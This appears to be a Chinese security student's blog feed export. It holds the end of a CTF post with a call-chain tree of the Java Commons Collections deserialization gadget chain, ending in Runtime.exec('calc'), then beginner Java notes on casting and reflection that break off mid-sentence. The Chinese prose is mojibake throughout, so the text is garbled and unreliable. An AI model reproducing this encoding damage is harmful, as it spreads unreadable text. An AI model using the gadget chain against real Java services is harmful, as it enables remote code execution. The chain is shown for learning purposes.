class="code"><pre><span class="line">ois.readObject()</span><br><span class="line">â””â”€â”€ AnnotationInvocationHandler.readObject()</span><br><span class="line">    â”œâ”€â”€ this.memberValues.entrySet()</span><br><span class="line">    â”‚   â””â”€â”€ (TransformedMap).entrySet()</span><br><span class="line">    â”‚       â””â”€â”€ AbstractInputCheckedMapDecorator.entrySet()</span><br><span class="line">    â”‚           â”œâ”€â”€ this.isSetValueChecking()</span><br><span class="line">    â”‚           â”‚   â””â”€â”€ (TransformedMap).isSetValueChecking()</span><br><span class="line">    â”‚           â””â”€â”€ new EntrySet(..., this) // åˆ›å»ºEntrySet</span><br><span class="line">    â”‚</span><br><span class="line">    â”œâ”€â”€ EntrySet.iterator()</span><br><span class="line">    â”‚   â””â”€â”€ new EntrySetIterator(..., this.parent) // åˆ›å»ºè¿­ä»£å™¨ï¼Œä¼ é€’parent</span><br><span class="line">    â”‚</span><br><span class="line">    â””â”€â”€ for (Map.Entry var5 : ...) // éå†å¾ªç¯</span><br><span class="line">        â”œâ”€â”€ EntrySetIterator.next()</span><br><span class="line">        â”‚   â””â”€â”€ new MapEntry(entry, this.parent)</span><br><span class="line">        â”‚</span><br><span class="line">        â”œâ”€â”€ ç±»å‹æ£€æŸ¥é€»è¾‘ (var7 != null &amp;&amp; !var7.isInstance(var8))</span><br><span class="line">        â”‚</span><br><span class="line">        â””â”€â”€ MapEntry.setValue(AnnotationTypeMismatchExceptionProxy)</span><br><span class="line">            â””â”€â”€ parent.checkSetValue(value)</span><br><span class="line">                â””â”€â”€ (TransformedMap).checkSetValue()</span><br><span class="line">                    â””â”€â”€ this.valueTransformer.transform(value) // æ‰§è¡Œé¢„è®¾çš„Transformeré“¾</span><br><span class="line">                        â””â”€â”€ ChainedTransformer.transform()</span><br><span class="line">                            â”œâ”€â”€ ConstantTransformer.transform() // Runtime.class</span><br><span class="line">                            â”œâ”€â”€ InvokerTransformer.transform() // getMethod(&quot;getRuntime&quot;)</span><br><span class="line">                            â”œâ”€â”€ InvokerTransformer.transform() // invoke(null) Runtime</span><br><span class="line">                            â””â”€â”€ InvokerTransformer.transform() // exec(&quot;calc&quot;)</span><br><span class="line">                                â””â”€â”€ Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaæ‹¾é—è¡¥é˜™</title>
      <link href="/2025/12/14/Java%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/"/>
      <url>/2025/12/14/Java%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaæ‹¾é—è¡¥é˜™"><a href="#Javaæ‹¾é—è¡¥é˜™" class="headerlink" title="Javaæ‹¾é—è¡¥é˜™"></a>Javaæ‹¾é—è¡¥é˜™</h1><p>åˆå­¦Javaï¼Œç¬¬ä¸€æ¬¡å°±è¢«å®ƒå†—é•¿çš„è¯­å¥æ‰€éœ‡æ’¼ï¼Œç•¥æœ‰æ¥è§¦ä¹‹åï¼Œå½“åˆçš„ç–‘é—®ä¸ä»…æ²¡æœ‰å‡å°‘ï¼Œåè€Œæœ‰æŒ‡æ•°å¢åŠ è¶‹åŠ¿ã€‚ä¸Šå¤§å­¦ä¹‹å‰å‡ ä¹æ²¡æœ‰å­¦ä¹ è¿‡ä»»ä½•ä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œåˆšæ¥è§¦çš„è¯­è¨€æ˜¯Cï¼Œä»ç°åœ¨çœ‹æ¥å½“åˆæ™¦æ¶©çš„CçœŸæ˜¯è¨€ç®€æ„èµ…ã€ä¼˜ç¾è‡³æã€‚è¿›å…¥ä¿¡å®‰åå†ä¸€æ¬¡æ¥è§¦åˆ°äº†PHPå’ŒPythonï¼Œè¿™ä¸¤ä½éƒ½æ˜¯è¾ƒä¸ºå‡ºåçš„é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œä½†æ˜¯æç«¯ç¨‹åº¦åœ¨Javaé¢å‰è¿˜æ˜¯ä¸å€¼ä¸€æ</p><p>å­¦Javaçš„é©±åŠ¨åŠ›åœ¨äºæƒ³è¦ææ‡‚Javaååºåˆ—åŒ–ï¼ŒèŒç”Ÿå‡ºè¿™ä¸ªå¿µå¤´çš„åŸå› åœ¨äºå½“æ—¶PHPååºåˆ—åŒ–å­¦å¾—è¿˜ç®—èˆ’é€‚ï¼Œç¬¬ä¸€æ¬¡çœ‹Javaååºåˆ—åŒ–çš„expç®€ç›´æ˜¯åœ¨çœ‹å¤©ä¹¦ï¼Œä¹‹åå‡ å¤©ç½‘ä¸Šæ‰¾äº†äº›Javaå…¥é—¨æ•™ç¨‹ï¼Œç„¶è€Œè¶Šæ˜¯å­¦ä¹ ï¼Œé—®é¢˜ä¹Ÿè¶Šä¸ºé¢‘ç¹åœ°å‡ºç°ã€‚å‰æ‘‡æœ‰ç‚¹è¿‡é•¿äº†ï¼Œæ­¤å¤„æ±‡æ€»äº†ä¸€äº›å­¦ä¹ Javaè¿‡ç¨‹çš„ç–‘æƒ‘åœ¨ç»è¿‡æ¼«é•¿æ€è€ƒåçš„ä¸æˆç†Ÿçš„ç†è§£æ–¹å¼ï¼Œå¯èƒ½å†…å®¹ä¼šå¾ˆå‰²è£‚ï¼Œä½†ä¹Ÿæ— å¦¨åæ­£æ˜¯æˆ‘è‡ªå·±çœ‹<code>:)</code></p><br/><h2 id="æç«¯çš„é¢å‘å¯¹è±¡"><a href="#æç«¯çš„é¢å‘å¯¹è±¡" class="headerlink" title="æç«¯çš„é¢å‘å¯¹è±¡"></a>æç«¯çš„é¢å‘å¯¹è±¡</h2><p>ä¸ºä»€ä¹ˆè¯´Javaæ˜¯éå¸¸æç«¯çš„é¢å‘å¯¹è±¡ï¼Œå› ä¸ºç›´åˆ°æˆ‘æ‰“å­—çš„è¿™ä¸€åˆ»ï¼Œæˆ‘è¿˜æ²¡æœ‰è§åˆ°ä»»ä½•ä¸€è¡Œä»£ç å¯ä»¥æ¸¸ç¦»åœ¨ç±»çš„å¤–éƒ¨æ‰§è¡Œï¼Œå°±è¿ç¨‹åºæ‰§è¡Œçš„å…¥å£<code>main</code>å‡½æ•°ï¼Œä¹Ÿéœ€è¦åŒ…è£…åœ¨ä¸€ä¸ªç±»é‡Œé¢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">================Peopleç±»</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> JavaStudy.greet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">greet</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Chinese</span> <span class="keyword">extends</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">greet</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä½ å¥½&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">American</span>  <span class="keyword">extends</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">greet</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Korean</span>  <span class="keyword">extends</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">greet</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ì•ˆë…•í•˜ì„¸ìš”&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">================Mainç±»</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> JavaStudy.greet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">People</span> <span class="variable">Chinese</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Chinese</span>();</span><br><span class="line">        <span class="type">People</span> <span class="variable">American</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">American</span>();</span><br><span class="line">        <span class="type">People</span> <span class="variable">Korean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Korean</span>();</span><br><span class="line"></span><br><span class="line">        Chinese.greet();</span><br><span class="line">        American.greet();</span><br><span class="line">        Korean.greet();</span><br><span class="line">        System.out.println();</span><br><span class="line">        </span><br><span class="line">        People[] people = <span class="keyword">new</span>  <span class="title class_">People</span>[<span class="number">3</span>];</span><br><span class="line">        people[<span class="number">0</span>]=Chinese;</span><br><span class="line">        people[<span class="number">1</span>]=American;</span><br><span class="line">        people[<span class="number">2</span>]=Korean;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(People element:people)&#123;</span><br><span class="line">            element.greet();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœåªèƒ½çœ‹åˆ°<code>main</code>å‡½æ•°çš„ä»£ç ï¼Œå‡ ä¹æ— æ³•ç†è§£ä»£ç è¿è¡Œçš„é€»è¾‘ï¼Œä¸€èˆ¬æˆ‘ä»¬åªèƒ½çœ‹åˆ°å¯¹è±¡è°ƒç”¨æ–¹æ³•ä½œä¸ºç¨‹åºè¿è¡Œçš„ä¸»è¦æ–¹å¼ï¼Œ<code>main</code>å‡½æ•°æ­¤åˆ»ä¸å†åƒCé‚£ä¹ˆå…·ä½“åœ°è´Ÿè´£æ¯ä¸€ä¸ªåŠ¨ä½œï¼Œè€Œæ˜¯ä¸€ä¸ªè°ƒåº¦å™¨ï¼Œåè°ƒå¤šä¸ªå¯¹è±¡è°ƒç”¨å®ƒä»¬çš„æ–¹æ³•ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºç¨‹åºè¿è¡Œçš„å•å…ƒ</p><br/><h2 id="ç±»å‹çš„å£°æ˜ä¸ç±»å‹çš„è½¬æ¢"><a href="#ç±»å‹çš„å£°æ˜ä¸ç±»å‹çš„è½¬æ¢" class="headerlink" title="ç±»å‹çš„å£°æ˜ä¸ç±»å‹çš„è½¬æ¢"></a>ç±»å‹çš„å£°æ˜ä¸ç±»å‹çš„è½¬æ¢</h2><p>åˆå­¦Javaç¬¬ä¸€æ¬¡çœ‹åˆ°å®ä¾‹åŒ–å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>;</span><br><span class="line"><span class="comment">//æ ¼å¼ä¸º å£°æ˜ç±»å‹ å¯¹è±¡åç§° = new å®é™…ç±»å‹</span></span><br></pre></td></tr></table></figure><p>è€Œåœ¨PHPä¸­ï¼Œå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡é•¿è¿™æ ·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dog</span> = <span class="keyword">new</span> <span class="title class_">Dog</span>;</span><br></pre></td></tr></table></figure><p>Javaå¤šå‡ºäº†ä¸€ä¸ªç§°ä¸ºå£°æ˜ç±»å‹çš„æ¦‚å¿µï¼Œåˆšå¼€å§‹ä¸èƒ½ç†è§£å…¶ä¸­çš„å«ä¹‰ï¼Œè€Œä¸”èµ·åˆå£°æ˜ç±»å‹å¤§å¤šä¸å®é™…ç±»å‹åŒ¹é…ï¼Œç›´åˆ°åé¢å­¦åˆ°ç»§æ‰¿ï¼Œå‡ºç°äº†ä¸‹é¢çš„å£°æ˜è¯­å¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>Animal</code>æ˜¯<code>Dog</code>çš„çˆ¶ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬å£°æ˜äº†ä¸€ä¸ª<code>Animal</code>ç±»å‹çš„å¯¹è±¡ï¼Œä½†å®ƒçš„å®é™…ç±»å‹å´æ˜¯<code>Dog</code>ï¼Œè€Œç”±æ­¤åˆ™å‡ºç°äº†ç±»å‹è½¬åŒ–çš„é—®é¢˜ã€‚å€˜è‹¥<code>Dog</code>ç±»æœ‰ä¸€ä¸ªç‰¹åˆ«çš„<code>bark</code>æ–¹æ³•ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½ç›´æ¥è°ƒç”¨<code>animal.bark()</code>ï¼Ÿç­”æ¡ˆæ˜¯ä¸è¡Œï¼Œæˆ‘ä»¬å£°æ˜çš„ç±»å‹æ˜¯<code>Animal</code>ï¼Œç¼–è¯‘å™¨ä¼šä»<code>Animal</code>ç±»ä¸­å¯»æ‰¾<code>bark</code>ï¼Œä½†æ˜¯<code>Animal</code>ç±»ä¸­å¹¶æ²¡æœ‰å®šä¹‰è¯¥æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šç¼–è¯‘æŠ¥é”™ã€‚ä½†æ˜¯ï¼Œè¿™é‡Œçš„<code>animal</code>å¯¹è±¡å®é™…ä¸Šå°±æ˜¯<code>Dog</code>ç±»å®ä¾‹åŒ–å‡ºæ¥çš„ï¼Œåˆ©ç”¨å‘ä¸‹è½¬å‹å¯ä»¥è®©<code>animal</code>æˆä¸º<code>Dog</code>ç±»å‹ï¼Œè¯­æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog) animal;</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ„‰å¿«åœ°ä½¿ç”¨<code>dog.bark()</code>äº†</p><p>ä½†æ˜¯è¿™æ ·çš„è½¬å‹æ˜¯ç”±æœ‰é£é™©çš„ï¼Œå¦‚æœ<code>animal</code>æ˜¯<code>cat</code>çš„å®ä¾‹åŒ–æ€ä¹ˆåŠï¼Ÿæ‰€ä»¥è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥çœ‹åˆ°åœ¨è¿›è¡Œå¼ºè½¬æ—¶éƒ½ä¼šæœ‰ä¸€å±‚ifåˆ¤æ–­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (animal <span class="keyword">instanceof</span> Dog) &#123;</span><br><span class="line">    <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog) animal;</span><br><span class="line">    dog.bark();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æœ‰å‘ä¸‹è½¬å‹ï¼Œé‚£ä¹Ÿæœ‰å‘ä¸Šè½¬å‹ï¼Œä½†æ˜¯å‘ä¸Šè½¬å‹é€šå¸¸ä¸éœ€è¦ç‰¹åˆ«å»å£°æ˜ï¼Œå› ä¸ºçˆ¶ç±»çš„æ–¹æ³•åœ¨å­ç±»æœ¬æ¥å°±å·²ç»ç»§æ‰¿å¥½äº†ï¼Œå®Œå…¨å¯ä»¥ç›´æ¥ä½¿ç”¨</p><blockquote><p>å¾€å¾€ä¸€ä¸ªæ–¹æ³•çš„è¿”å›å€¼ç±»å‹æ˜¯ç¡®å®šçš„ï¼Œæ¯”å¦‚è¿”å›çš„æ˜¯é€šç”¨çš„<code>Object</code>ç±»å‹ï¼Œä½†æ˜¯æˆ‘ä»¬è‹¥å®é™…çŸ¥é“è¿™æ˜¯<code>Dog</code>ç±»å‹ä¸”éœ€è¦è°ƒç”¨å®ƒï¼Œæ­¤æ—¶å¼ºè½¬çš„é‡è¦æ€§å°±æ›´åŠ å‡¸æ˜¾äº†</p></blockquote><br/><h2 id="åˆ©ç”¨åå°„ä¿®æ”¹ç§æœ‰æˆå‘˜"><a href="#åˆ©ç”¨åå°„ä¿®æ”¹ç§æœ‰æˆå‘˜" class="headerlink" title="åˆ©ç”¨åå°„ä¿®æ”¹ç§æœ‰æˆå‘˜"></a>åˆ©ç”¨åå°„ä¿®æ”¹ç§æœ‰æˆå‘˜</h2><p>åˆ©ç”¨åå°„æˆ‘ä»¬å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ä¿®æ”¹ä¸€ä¸ªç§æœ‰å±æ€§æˆ–ç§æœ‰æ–¹æ³•ï¼Œä½†ä½¿ç”¨å®ƒçš„ä»£ç ä¹Ÿå¾ˆå¤æ‚</p><p>å®šä¹‰ä¸€ä¸ª<code>Person</code>ç±»ï¼Œé‡Œé¢æ”¾ä¸€äº›ç§æœ‰å±æ€§</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">testMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test Success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ReflectFieldç±»æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨åå°„ä¿®æ”¹ç§æœ‰å±æ€§"><a href="#ReflectFieldç±»æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨åå°„ä¿®æ”¹ç§æœ‰å±æ€§" class="headerlink" title="ReflectFieldç±»æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨åå°„ä¿®æ”¹ç§æœ‰å±æ€§"></a><code>ReflectField</code>ç±»æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨åå°„ä¿®æ”¹ç§æœ‰å±æ€§</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectField</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;æå››&quot;</span>, <span class="number">30</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = person.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–publicå­—æ®µ</span></span><br><span class="line">         Field[] fields = clazz.getFields();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ‰€æœ‰å­—æ®µï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰</span></span><br><span class="line">        Field[] allFields = clazz.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Field field : allFields) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å­—æ®µå: &quot;</span> + field.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;å­—æ®µç±»å‹: &quot;</span> + field.getType());</span><br><span class="line">            System.out.println(<span class="string">&quot;ä¿®é¥°ç¬¦: &quot;</span> + Modifier.toString(field.getModifiers()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¿é—®ç§æœ‰å­—æ®µ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        ageField.setAccessible(<span class="literal">true</span>); <span class="comment">// è®¾ç½®å¯è®¿é—®ç§æœ‰å­—æ®µ</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ageValue</span> <span class="operator">=</span> (<span class="type">int</span>) ageField.get(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;å¹´é¾„: &quot;</span> + ageValue);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¿®æ”¹ç§æœ‰å­—æ®µ</span></span><br><span class="line">        ageField.set(person, <span class="number">13</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¿®æ”¹åå¹´é¾„: &quot;</span> + person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå°„ä»<code>Class&lt;?&gt; clazz = person.getClass();</code>å¼€å§‹ï¼Œè¿™é‡Œè·å–äº†<code>person</code>å¯¹è±¡è¿è¡Œæ—¶çš„ç±»ä¿¡æ¯ï¼Œåˆ©ç”¨<code>getDeclaredField()</code>è·å–å­—æ®µï¼Œç„¶ååˆ©ç”¨<code>setAccessible()</code>è®¾ç½®å­—æ®µå¯è®¿é—®ï¼Œæœ€åä½¿ç”¨<code>set(å¯¹è±¡å®ä¾‹,ä¿®æ”¹åçš„å€¼)</code>æ–¹æ³•å®ç°å¯¹è±¡å­—æ®µçš„ä¿®æ”¹</p><blockquote><p>å¯ä»¥æ³¨æ„åˆ°åœ¨è·å–ä¿®é¥°ç¬¦æ—¶çš„ä»£ç æ˜æ˜¾æ›´åŠ å¤æ‚ï¼Œå› ä¸ºä¿®é¥°ç¬¦æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªintç±»å‹çš„ä½æ©ç (bitmask)ï¼Œåœ¨è·å–ä¿®é¥°ç¬¦åè¿˜éœ€è¦ä½¿ç”¨<code>Modifier.toString()</code>æ–¹æ³•å°†å…¶è½¬åŒ–ä¸ºå¯è¯»çš„å­—ç¬¦ä¸²</p></blockquote><blockquote><p><code>Field</code>çš„<code>get</code>æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ª<code>Object</code>å¯¹è±¡ï¼Œ <code>int ageValue = (int) ageField.get(person)</code>è¿™ä¸€æ®µè¿›è¡Œäº†å¼ºè½¬ï¼Œä¹Ÿæ˜¯æˆåŠŸç…§åº”ä¸Šæ–‡</p></blockquote><h3 id="ReflectMethodç±»æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•"><a href="#ReflectMethodç±»æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•" class="headerlink" title="ReflectMethodç±»æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•"></a><code>ReflectMethod</code>ç±»æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectMethod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;å¼ ä¸‰&quot;</span>, <span class="number">28</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = person.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">        Method[] methods = clazz.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–ç‰¹å®šæ–¹æ³•å¹¶è°ƒç”¨</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">setNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        setNameMethod.invoke(person, <span class="string">&quot;å­™ä¸ƒ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) getNameMethod.invoke(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;å§“å: &quot;</span> + name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨ç§æœ‰æ–¹æ³•</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">privateMethod</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;testMethod&quot;</span>);</span><br><span class="line">        privateMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        privateMethod.invoke(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾æ—§ä»<code>Class&lt;?&gt; clazz = person.getClass();</code>å‡ºå‘ï¼Œä½¿ç”¨<code>getMethod(æ–¹æ³•å,å‚æ•°ç±»å‹æ•°ç»„)</code>è·å¾—<code>Method</code>å¯¹è±¡ï¼Œä½¿ç”¨<code>setAccessible()</code>è·å¾—è°ƒç”¨æƒï¼Œä¹‹åå¯¹å…¶å¯ä»¥ä½¿ç”¨<code>invoke(å¯¹è±¡å®ä¾‹,æ–¹æ³•å‚æ•°å€¼æ•°ç»„)</code>è°ƒç”¨ï¼Œè‹¥è¦è°ƒç”¨çš„æ–¹æ³•æ— å‚åˆ™å¯çœç•¥ </p><blockquote><p>ç›¸ä¿¡éƒ½æ³¨æ„åˆ°åˆ°äº†<code>String name = (String) getNameMethod.invoke(person);</code>è¿™é‡Œåˆæ¥äº†ä¸€æ¬¡å¼ºè½¬ï¼Œå› ä¸ºè¿™é‡Œè¿”å›çš„åˆæ˜¯ä¸€ä¸ª<code>Object</code>å¯¹è±¡(ä¸‡é‡‘æ²¹äº†å±äºæ˜¯)</p></blockquote><h3 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h3><p>æœ€è¿‘çœ‹é¢˜çœ‹åˆ°åˆ«äººå†™çš„åå°„è°ƒç”¨æ–¹æ³•çš„æ–¹æ³•ï¼Œè¿™é‡Œè¯´è¯´è¿è¡Œé€»è¾‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">default</span> Object <span class="title function_">wagTail</span><span class="params">(Object input, String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(methodName, paramTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>Class cls = input.getClass();</code>ï¼Œæ˜¯ä¸æ˜¯å¾ˆçœ¼ç†Ÿï¼Ÿè¿™é‡Œå°±æ˜¯å‰é¢è¯´åå°„çš„å¼€å§‹ï¼Œ<code>cls</code>è·å–äº†<code>input</code>è¿è¡Œæ—¶ç±»çš„ä¿¡æ¯ï¼Œåé¢å°±æ˜¯è·å¾—æ–¹æ³•åã€è°ƒç”¨æ–¹æ³•ã€‚åŸé¢˜ç”¨äº†ä¸€ä¸ªå‡ 